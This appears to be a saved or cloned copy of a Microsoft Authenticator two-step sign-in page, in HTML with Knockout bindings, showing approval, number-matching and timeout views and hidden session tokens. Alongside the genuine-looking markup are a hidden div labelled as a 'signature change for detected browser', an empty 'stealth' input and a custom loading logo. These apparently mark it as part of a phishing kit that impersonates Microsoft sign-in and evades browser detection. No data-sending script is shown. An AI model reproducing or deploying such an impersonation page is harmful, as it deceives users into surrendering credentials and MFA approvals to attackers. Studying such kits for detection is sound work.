<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small animate-pulse" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg" data-bind="imgSrc, css: { \'small\': small, \'animate-pulse\': animate }" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Certificate --><!-- /ko -->

<!-- ko if: svr.fDisplayCompanionApp -->
    <!-- ko if: type === PROOF.Type.CompanionApp --><!-- /ko -->
<!-- /ko --></div>
    <div class="text-block-body overflow-hidden">
        <div id="idDiv_SAOTCAS_Description" data-bind="htmlWithBindings: description, childBindings: { \'idSpan_SAOTCAS_DescSessionID\': { css: { \'bold\': true } } }">Open your Authenticator app, and enter the number shown to sign in.</div>
        <!-- ko if: description2 --><!-- /ko -->
    </div>
</div>

<!-- ko if: displaySign -->
<div class="section">
    <div class="row text-body">
        <div id="idRichContext_DisplaySign" class="displaySign" data-bind="text: displaySign"></div>
    </div>
</div>

<div class="row text-body">
    <div class="richtext-warning" data-bind="text: str[\'CT_SAOTCRC_STR_Missing_Numbers\']">No numbers in your app? Make sure to upgrade to the latest version.</div>
</div>
<!-- /ko -->

<div>
    <!-- ko if: doPolling --><!-- /ko -->
</div>

<div data-bind="css: { \'position-buttons\': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="row no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown" style="display: none;">
            <div class="col-md-24 form-group no-margin-top checkbox">
                <label id="idLbl_SAOTCAS_TD_Cb">
                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                    <input id="idChkBx_SAOTCAS_TD" type="checkbox" value="true" data-bind="
                        attr: { name: svr.sTrustedDeviceCheckboxName },
                        ariaLabel: str[\'CT_SAOTCAS_STR_AddTD\'],
                        ariaDescribedBy: [\'idDiv_SAOTCAS_Title\', \'idDiv_SAOTCAS_Description\'].concat(description2 ? [\'idDiv_RichContext_Description\'] : []).join(\' \'),
                        hasFocusEx: tdCheckbox.isShown,
                        checked: tdCheckbox.isChecked,
                        disable: tdCheckbox.isDisabled" name="rememberMFA" aria-label="Don\'t ask again for undefined days" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">
                    <span data-bind="text: str[\'CT_SAOTCAS_STR_AddTD\']">Don\'t ask again for undefined days</span>
                </label>
            </div>
        </div>

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: showSwitchProofsLink -->
                    <div id="idDiv_SAOTCS_HavingTrouble" class="form-group" data-bind="
                            css: { \'no-margin-bottom\': !svr.urlMoreInfo },
                            htmlWithBindings: toggleText,
                            childBindings: {
                                \'signInAnotherWay\': {
                                    click: switchToOtcRequest_onClick,
                                    hasFocusEx: !tdCheckbox.isShown,
                                    ariaDescribedBy: [\'idDiv_SAOTCAS_Title\', \'idDiv_SAOTCAS_Description\'].concat(description2 ? [\'idDiv_RichContext_Description\'] : []).join(\' \') } }"><a href="#" id="signInAnotherWay" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">I can\'t use my Microsoft Authenticator app right now</a></div>
                    <!-- /ko -->

                    <!-- ko if: svr.urlMoreInfo -->
                    <div class="form-group no-margin-bottom">
                        <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="text: str[\'CT_STR_More_Info\'], href: svr.urlMoreInfo, ariaLabel: str[\'CT_STR_More_Info_AriaLabel\']" aria-label="More information about two step verification">More information</a>
                    </div>
                    <!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { \'boilerplate-button-bottom\': tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { \'move-buttons\': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: \'footer-buttons-field\',
                params: {
                    serverData: svr,
                    isPrimaryButtonVisible: false,
                    isSecondaryButtonVisible: !showSwitchProofsLink,
                    secondaryButtonText: str[\'CT_SAOTCC_STR_Cancel\'] },
                event: {
                    secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { \'no-margin-bottom\': removeBottomMargin },
    externalCss: { \'button-field-container\': true }" style="display: none;">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { \'inline-block\': isPrimaryButtonVisible }, externalCss: { \'button-item\': true }" class="button-item ext-button-item">
        <!-- type="submit" is needed in-addition to \'type\' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    \'button\': true,
                    \'primary\': true },
                value: primaryButtonText() || str[\'CT_PWD_STR_SignIn_Button_Next\'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" style="display: none;">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
	<div style="display:none;" class="show-mfa3-code pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        \'has-identity-banner\': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        \'zero-opacity\': hidePaginatedView.hideSubView(),
        \'animate\': animate(),
        \'slide-out-next\': animate.isSlideOutNext(),
        \'slide-in-next\': animate.isSlideInNext(),
        \'slide-out-back\': animate.isSlideOutBack(),
        \'slide-in-back\': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="6" data-showidentitybanner="true" data-bind="pageViewComponent: { name: \'session-approval-view\',
                    params: {
                        serverData: svr,
                        sentProof: sharedData.sentProof,
                        username: sharedData.username,
                        supportsBack: true,
                        isInitialState: isInitialState,
                        sessionIdentifier: sharedData.sessionIdentifier,
                        showCancelButton: sharedData.showCancelButton,
                        trustedDeviceCheckboxConfig: sharedData.trustedDeviceCheckboxConfig,
                        currentPollStartTime: sharedData.currentPollStartTime,
                        currentPollEndTime: sharedData.currentPollEndTime,
                        twoWayPollingNeeded: sharedData.twoWayPollingNeeded,
                        sessionApprovalError: sharedData.sessionApprovalError,
                        flowToken: sharedData.flowToken,
                        entropy: sharedData.entropy },
                    event: {
                        cancel: view_onCancel,
                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        submitReady: $tfaPage.view_onSubmitReady } }"><!--  -->

<input type="hidden" name="type" data-bind="value: \'22\'" value="22">
<input type="hidden" name="request" data-bind="value: svr.sCtx" value="rQQIARAAhZM_jNt0FMfj5C7koiscR4uKWG7ogFrZsX92EvsAiSTOH98lTmI758SL5fhfnPi_nTjxhGCABdGhMJyYkFhugwXEBBu6qVIlRG-oUIcOIKQKlrKRwlyxPH2f3vsOT9_PKxYqCAYQDEFv5wCCHt8iqpUyQZSnMA7UCkxQUxQmcb0CYxqFb0egWlGV8LB4AO6df5UNNo33P_r9p8dPbr99AR3N4tiPjkulJEkQzzAsVUdUzynZiqtZrrkC30HQfQg6z-7qLjziL7JRBa9SGAFAFcVICi_jBIGwc9but4fricPEbKomPQtFWZqbdQUTnwijWBJG-GTecqT2mcW2W05P5BY9cZSy6SJmaYaQeBTttZl1VzzZ7jCxRC-IHt1c9-Yzp0-rxFX2lX5tGc_A8-KFVqr_md0zvNCRfS-Kz3OfZ0m6OoIjipMiw2SadDoZJMISGxvxsI5TDXe0thRZrcNccDb0o7FnBzQ-XQ0bMyAx1aBugoUkYl3YJhUzrBHhJqmnDtN0u91m1PI7ZRtNB749xVHcFqqdqJwOpiZJblyqMbcXnEJLM2AGp0BYEBQPe8aQDLnGCK413FjENmHTmAsnpiTyhMHzrbqyHBqLJGgroJl4da9lruChrkhV1le1mh42tKZwNpG58oJzcW8wHvoVEcAoBfhW0NSIEGOlWt9uke1wwqwGFbZCYaShj9kTQMoaLAejmROfpq4om6p5kXvjBfGuwDe5_FY4nnuZq3q-7lrakR96hmXrL0JiBUr9f7uO5-hIzbYf524pquot3fg931Y220A0Q3Ese-PomqUq9nMXoizv70C_7bxeyB_s34SOMm9dR3PHhULxIHMzc5R5tgN9ubsF82v97w9_fvAO88n66uH1T29kLndLkqVtjDteYAagfBYx7dOpYNZ1cVk2TpJuWO6P7TuYUOPEAGXeBcfY3Tx0N5-_zL_K0DLbFHihxtI1jgYy-jSf_fgl6Pu9_0X9g_1rhczh3t4j99s3v-CvOlf7rxWLS0u2ve0xenT43wv8cC3z7OVfn_7y2Y9_3fuj8w81">
<input type="hidden" name="mfaLastPollStart" data-bind="value: currentPollStartTime" value="1655826439762">
<input type="hidden" name="mfaLastPollEnd" data-bind="value: currentPollEndTime" value="1655826441510">

<!-- ko if: twoWayPollingNeeded -->
<input type="hidden" data-bind="attr: { name: svr.sAuthMethodInputFieldName }, value: \'PhoneAppNotification\'" name="mfaAuthMethod" value="PhoneAppNotification">
<!-- /ko -->

<!-- ko if: svr.canary -->
<input type="hidden" name="canary" data-bind="value: svr.canary" value="Zidyf+oqgq25VsIGKbTgBeWu5fJwLr5OXl+1TARWq0I=9:1">
<!-- /ko -->

<div id="idDiv_SAOTCAS_Title" class="row text-title" role="heading" aria-level="1" data-bind="text: title">Approve sign in request</div>
<div class="row text-body">
    <div data-bind="component: { name: \'proof-image-control\', params: { type: PROOF.Type.TOTPAuthenticatorV2, small: true, animate: true } }"><!--  -->

<!-- ko if: type === PROOF.Type.Email --><!-- /ko -->

<!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- /ko -->

<!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 -->
    <!-- ko if: !svr.fUseNewAuthenticatorIcon --><!-- /ko -->

    <!-- ko if: svr.fUseNewAuthenticatorIcon -->
        <!-- ko component: \'accessible-image-control\' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small animate-pulse" role="presentation" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_authenticator_942ac71f77cb04004b0ab25950e170b5.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg" data-bind="imgSrc, css: { \'small\': small, \'animate-pulse\': animate }" src="https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_fluent_authenticator_b59c16ca9bf156438a8a96d45e33db64.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
    <!-- /ko -->
<!-- /ko -->

<!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko -->

<!-- ko if: type === PROOF.Type.FidoKey --><!-- /ko -->

<!-- ko if: type === PROOF.Type.AccessPass --><!-- /ko --></div>
    <div class="text-block-body overflow-hidden">
        <div id="idDiv_SAOTCAS_Description" data-bind="htmlWithBindings: description, childBindings: { \'idSpan_SAOTCAS_DescSessionID\': { css: { \'bold\': true } } }">Open your Microsoft Authenticator app and approve the request to sign in</div>
        <!-- ko if: description2 --><!-- /ko -->
    </div>
</div>

<!-- ko if: displaySign --><!-- /ko -->

<div>
    <!-- ko if: doPolling --><!-- /ko -->
</div>

<div data-bind="css: { \'position-buttons\': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="row no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown" style="display: none;">
            <div class="col-md-24 form-group no-margin-top checkbox">
                <label id="idLbl_SAOTCAS_TD_Cb">
                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                    <input id="idChkBx_SAOTCAS_TD" type="checkbox" value="true" data-bind="
                        attr: { name: svr.sTrustedDeviceCheckboxName },
                        ariaLabel: str[\'CT_SAOTCAS_STR_AddTD\'],
                        ariaDescribedBy: [\'idDiv_SAOTCAS_Title\', \'idDiv_SAOTCAS_Description\'].concat(description2 ? [\'idDiv_RichContext_Description\'] : []).join(\' \'),
                        hasFocusEx: tdCheckbox.isShown,
                        checked: tdCheckbox.isChecked,
                        disable: tdCheckbox.isDisabled" name="rememberMFA" aria-label="Don\'t ask again for undefined days" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">
                    <span data-bind="text: str[\'CT_SAOTCAS_STR_AddTD\']">Don\'t ask again for undefined days</span>
                </label>
            </div>
        </div>

        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <!-- ko if: showSwitchProofsLink -->
                    <div style="" id="idDiv_SAOTCS_HavingTrouble" class="form-group" data-bind="
                            css: { \'no-margin-bottom\': !svr.urlMoreInfo },
                            htmlWithBindings: toggleText,
                            childBindings: {
                                \'signInAnotherWay\': {
                                    hasFocusEx: !tdCheckbox.isShown,
                                    ariaDescribedBy: [\'idDiv_SAOTCAS_Title\', \'idDiv_SAOTCAS_Description\'].concat(description2 ? [\'idDiv_RichContext_Description\'] : []).join(\' \') } }"><a href="#" id="signInAnotherWay" aria-describedby="idDiv_SAOTCAS_Title idDiv_SAOTCAS_Description">I can\'t use my Microsoft Authenticator app right now</a></div>
                    <!-- /ko -->

                    <!-- ko if: svr.urlMoreInfo -->
                    <div class="form-group no-margin-bottom">
                        <a id="moreInfoUrl" target="_blank" href="" data-bind="text: str[\'CT_STR_More_Info\'], href: svr.urlMoreInfo, ariaLabel: str[\'CT_STR_More_Info_AriaLabel\']" aria-label="More information about two step verification">More information</a>
                    </div>
                    <!-- /ko -->
                </div>
            </div>
        </div>
    </div>

    <div class="win-button-pin-bottom" data-bind="css : { \'boilerplate-button-bottom\': tenantBranding.BoilerPlateText }">
        <div class="row" data-bind="css: { \'move-buttons\': tenantBranding.BoilerPlateText }">
            <div data-bind="component: { name: \'footer-buttons-field\',
                params: {
                    serverData: svr,
                    isPrimaryButtonVisible: false,
                    isSecondaryButtonVisible: !showSwitchProofsLink,
                    secondaryButtonText: str[\'CT_SAOTCC_STR_Cancel\'] },
                event: {
                    secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { \'no-margin-bottom\': removeBottomMargin }" style="display: none;">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { \'inline-block\': isPrimaryButtonVisible }">
        <!-- type="submit" is needed in-addition to \'type\' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    \'button\': true,
                    \'primary\': true },
                value: primaryButtonText() || str[\'CT_PWD_STR_SignIn_Button_Next\'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" style="display: none;" data-report-attached="1">
    </div>
</div></div>
        </div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
	
	<div id="id-signature-change" style="display:none;">
		<p> THIS WORKS AS A SIGNA TURE CHANGE FOR DETECED BROWSER</p>
	</div>
	<div style="display:none;" class="mfa2-error pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        \'has-identity-banner\': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        \'zero-opacity\': hidePaginatedView.hideSubView(),
        \'animate\': animate(),
        \'slide-out-next\': animate.isSlideOutNext(),
        \'slide-in-next\': animate.isSlideInNext(),
        \'slide-out-back\': animate.isSlideOutBack(),
        \'slide-in-back\': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="7" data-showidentitybanner="true" data-bind="pageViewComponent: { name: \'session-approval-timeout-view\',
                    params: {
                        serverData: svr,
                        sentProof: sharedData.sentProof,
                        username: sharedData.username,
                        hasTotp: sharedData.hasTotp,
                        showCancelButton: sharedData.showCancelButton,
                        sessionApprovalError: sharedData.sessionApprovalError,
                        debugDetails: sharedData.debugDetails,
                        flowToken: sharedData.flowToken,
                        sessionApprovalError: sharedData.sessionApprovalError },
                    event: {
                        cancel: view_onCancel,
                        updateFlowToken: $tfaPage.view_onUpdateFlowToken,
                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick } }"><!--  -->

<div>
    <div class="row text-title" role="heading" aria-level="1" data-bind="visible: !sendErrorOccurred,
        html: titleText,
        attr: { id: getId(\'idDiv\', \'Title\') }" id="idDiv_SAASTO_Title">We didn\'t hear from you</div>

    <div class="text-block-body form-group">
        <span class="form-group" role="alert" data-bind="
            visible: sendErrorOccurred,
            text: str[\'CT_SAASTO_STR_Error_SendFail\'],
            attr: { id: getId(\'idDiv\', \'SendErrorTitle\') }" style="display: none;" id="idDiv_SAASTO_SendErrorTitle">Request wasn\'t sent</span>

        <span class="form-group" role="alert" data-bind="
            visible: !sendErrorOccurred,
            attr: { id: getId(\'idDiv\', \'Description\') },
            css: { \'alert alert-error\': error() &amp;&amp; !isAuthLimitReached },
            htmlWithBindings: descriptionText,
            childBindings: {
                \'useAuthenticator\': {
                    click: switchToOtcConfirm_onClick,
                    ariaDescribedBy: \'idDiv_SAASTO_Title idDiv_SAASTO_Description\',
                    hasFocus: true },
                \'useVerificationCode\': {
                    click: switchToOtcConfirm_onClick,
                    ariaDescribedBy: \'idDiv_SAASTO_Title idDiv_SAASTO_Description\',
                    hasFocus: true } }" id="idDiv_SAASTO_Description">We sent an identity verification request to your Microsoft Authenticator app, but we didn\'t hear from you in time.</span>

        <!-- ko if: svr.fShowViewDetailsLink && !isAuthLimitReached -->
        <a id="ViewDetails" class="no-wrap" href="#" data-bind="
            text: str[\'CT_STR_Error_ViewDetails\'],
            clickExpr: onShowDebugDetails(debugDetails, true),
            ariaLabel: str[\'CT_STR_Error_ViewDetailsAriaLabel\']" aria-label="View debugging details for this error">View details</a>
        <!-- /ko -->
    </div>

    <!-- ko ifnot: isAuthLimitReached -->
    <div class="form-group">
        <a href="#" data-bind="html: str[\'CT_SAASTO_STR_Resend\'], attr: { id: getId(\'idA\', \'Resend\') }, click: resend_onClick" id="idA_SAASTO_Resend"></a>
    </div>
    <!-- /ko -->

</div>

<!-- ko if: !isAuthLimitReached && (allowTotp || showSwitchProofsLink) -->
<div>
    <div class="text-subtitle" data-bind="html: str[\'CT_SAOTCAS_STR_Trouble\'], attr: { id: getId(\'idDiv\', \'Trouble\') }" id="idDiv_SAASTO_Trouble">Having trouble?</div>
   
</div>
<!-- /ko -->

<!-- ko if: isAuthLimitReached && showSwitchProofsLink --><!-- /ko -->

<div data-bind="css: { \'position-buttons\': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div>
        <!-- ko if: svr.urlMoreInfo -->
        <div class="row">
            <div class="col-md-24">
                <div class="text-13">
                    <div class="form-group">
                        <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                            text: str[\'CT_STR_More_Info\'],
                            href: svr.urlMoreInfo,
                            ariaLabel: str[\'CT_STR_More_Info_AriaLabel\']" aria-label="More information about two step verification">More information</a>
                    </div>
                </div>
            </div>
        </div>
        <!-- /ko -->
    </div>
</div>

<div class="win-button-pin-bottom" data-bind="css : { \'boilerplate-button-bottom\': tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { \'move-buttons\': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: \'footer-buttons-field\',
            params: {
                serverData: svr,
                removeBottomMargin: !svr.urlMoreInfo,
                isPrimaryButtonVisible: false,
                secondaryButtonId: getId(\'idBtn\', \'Cancel\'),
                secondaryButtonText: str[\'CT_SAOTCC_STR_Cancel\'],
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; showCancelButton },
            event: {
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { \'no-margin-bottom\': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible -->
    <div class="inline-block">
        <input type="button" id="idBtn_SAASTO_Cancel" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
            attr: { \'id\': secondaryButtonId || \'idBtn_Back\' },
            externalCss: {
                \'button\': true,
                \'secondary\': true },
            value: secondaryButtonText() || str[\'CT_HRD_STR_Splitter_Back\'],
            ariaDescribedBy: secondaryButtonDescribedBy,
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled" value="Cancel">
    </div>
    <!-- /ko -->

    <div data-bind="css: { \'inline-block\': isPrimaryButtonVisible }">
        <!-- type="submit" is needed in-addition to \'type\' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    \'button\': true,
                    \'primary\': true },
                value: primaryButtonText() || str[\'CT_PWD_STR_SignIn_Button_Next\'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing" value="Next" style="display: none;">
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
                        </div>
                     </div>
                  </div>
                  <div>
                  </div>
                  <div class="footer" id="footer">
                     <div>
                        <div class="footerNode text-secondary">
                           <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                \'footer-content\': true,
                \'footer-item\': true,
                \'has-background\': !useDefaultBackground,
                \'background-always-visible\': hasDarkBackground }" href="https://www.microsoft.com/fr/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms &amp; Conditions</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                \'footer-content\': true,
                \'footer-item\': true,
                \'has-background\': !useDefaultBackground,
                \'background-always-visible\': hasDarkBackground }" href="https://privacy.microsoft.com/fr/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Cookie Privacy</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->
        <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[\'CT_STR_More_Options_Ellipsis_AriaLabel\'],
        attr: { \'aria-expanded\': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            \'footer-content\': true,
            \'footer-item\': true,
            \'debug-item\': true,
            \'has-background\': !useDefaultBackground,
            \'background-always-visible\': hasDarkBackground }" aria-label="Cliquez ici pour obtenir des informations sur la rÃ©solution des problÃ¨mes" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>

                           <a href="#"><img src=""></a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
			<input type="hidden" class="stealth">

      </div> 
              <div id="loadingScreen" style="display: none;">
                    <svg id="loadingLogo" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 220 220" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" width="220" height="220"><g id="loadingLogo2_ts" transform="translate(108.894430,155.715127) scale(0.668963,0.668963)"><g id="loadingLogo2" transform="translate(-100.998749,-141)" opacity="0"><g id="loadingLogo3_to" transform="translate(101.000155,195.970703)">
                        <g id="loadingLogo3" style="filter: drop-shadow(0px 4px 0px rgba(0, 0, 0, 0))" transform="translate(-101.000155,-195.970703)">
                        <g id="loadingLogo4">
                            <path id="loadingLogo5" d="M20.933784,97.210600C20.933784,97.210600,20.178271,92.940053,20.024003,93L182.019255,93C182.019255,93,182.014000,95.531900,181.999000,97.210600C182.023000,98.906600,181.177000,100.496000,179.759000,101.421000L106.684000,145.998000L105.732000,146.559000C104.337000,147.306000,102.778000,147.691000,101.197000,147.682000C99.633300,147.689000,98.093100,147.303000,96.716900,146.559000L95.709000,145.998000L22.410100,101.421000C20.902100,100.535000,22.381585,98.916937,20.933784,97.210600Z" transform="matrix(1 0 0 1 -0.02180297631334 3.99999999659653)" fill="rgb(18,59,109)" stroke="none" stroke-width="1"></path>
                        <g id="loadingLogo6_ts" transform="translate(101.000708,97.499588) scale(1,-0.001720)">
                            <path id="loadingLogo6" d="M179.759000,93.373200L106.572000,48.740400L105.620000,48.122800C104.215000,47.403400,102.663000,47.019100,101.085000,47C99.524600,47.019600,97.990700,47.404100,96.604900,48.122800L95.597000,48.740400L22.298100,93.317000C20.875500,94.218100,20.009900,95.804917,20.002200,97.491917C19.983300,99.244317,20.902100,100.852000,22.410100,101.738000L95.709000,146.315000L96.716900,146.876000C98.093100,147.620000,99.633300,148.006000,101.197000,147.999000C102.778000,148.009000,104.337000,147.623000,105.732000,146.876000L106.684000,146.315000L179.759000,101.738000C181.177000,100.813000,182.023000,99.223700,181.999000,97.527700C182.014000,95.849000,181.168000,94.280100,179.759000,93.373200Z" transform="translate(-101.000708,-97.499588)" fill="rgb(18,59,109)" stroke="none" stroke-width="1"></path></g></g><g id="loadingLogo7" clip-path="url(#loadingLogo22)"><g id="loadingLogo8_ts" transform="translate(101.000699,159.914723) scale(1,1)"><g id="loadingLogo8" transform="translate(-101.000699,-159.914723)"><g id="loadingLogo9_to" transform="translate(101,205.753765)"><g id="loadingLogo9" transform="translate(-101,-81)"><path id="loadingLogo10" d="M28,10C28,4.477150,32.477200,0,38,0L164,0C169.523000,0,174,4.477150,174,10C174,10,173.999301,28.355009,173.999301,28.355009L28,51.060529L28,10Z" 